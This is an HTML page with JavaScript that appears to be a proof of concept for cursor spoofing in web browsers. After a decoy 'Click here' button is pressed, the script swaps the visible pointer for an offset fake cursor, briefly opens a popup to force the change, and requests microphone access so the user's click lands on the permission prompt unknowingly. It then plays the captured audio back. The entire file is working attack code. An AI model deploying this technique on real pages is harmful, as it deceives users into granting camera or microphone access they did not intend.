<!doctype html>
<html>
<head>
<style>
  html, 
  body {
    width: 100%;
    height: 100%;
  }
  img {
    pointer-events: none;
  }
  #button {
    position: absolute;
    top: 150px;
    left: 310px;
  }
</style>
</head>
<body>
  <button id="button">Click here</button>
  <img src="cursor.png" id="cursor" style="display:none">
<script>
const cursor = document.getElementById("cursor");
const button = document.getElementById("button");
let fakeCursor = false;
let lastPos = [0,0];


document.addEventListener("mousemove", (e) => {
  if (!fakeCursor) {
    document.body.style.cursor = "auto";
    cursor.style.display = "none";
    lastPos = [e.clientX, e.clientY];
  } else {
    setFakecursor(e.clientX, e.clientY);
  }
});

function setFakecursor(clientX, clientY) {
  cursor.style.display = "block";
  cursor.style.position = 'absolute';
  cursor.style.top = clientY + 'px';
  cursor.style.left = clientX + 'px';
  const x = Math.max(Math.min(clientX - 118 -155, 128),0);
  const y = Math.max(Math.min(clientY + -128 +42, 128),0);
  document.body.style.cursor = `url('overlay.png') ${x} ${y}, auto`;
}

button.addEventListener("mousedown", (e) => setFakecursor(e.clientX, e.clientY));
button.onclick = () => {
  button.remove();
  fakeCursor = true;
  setFakecursor(...lastPos);
  useMicrophone(()=>{fakeCursor = false});
  // Refocus main window to force our css cursor to appear
  let w = window.open("about:blank", null, "popup");
  setTimeout(()=>w.close(), 100);
};


// Helper function to use and play back the microphone
function useMicrophone(callback) {
  navigator.mediaDevices.getUserMedia({"audio": true}).then((stream)=>{
    callback();
    const audioContext = new AudioContext();
    const microphone = audioContext.createMediaStreamSource(stream);
    const destination = audioContext.destination;
    microphone.connect(destination);
    document.body.appendChild(document.createTextNode("Playing back microphone audio..."));
  });
}
</script>
</body>
</html>
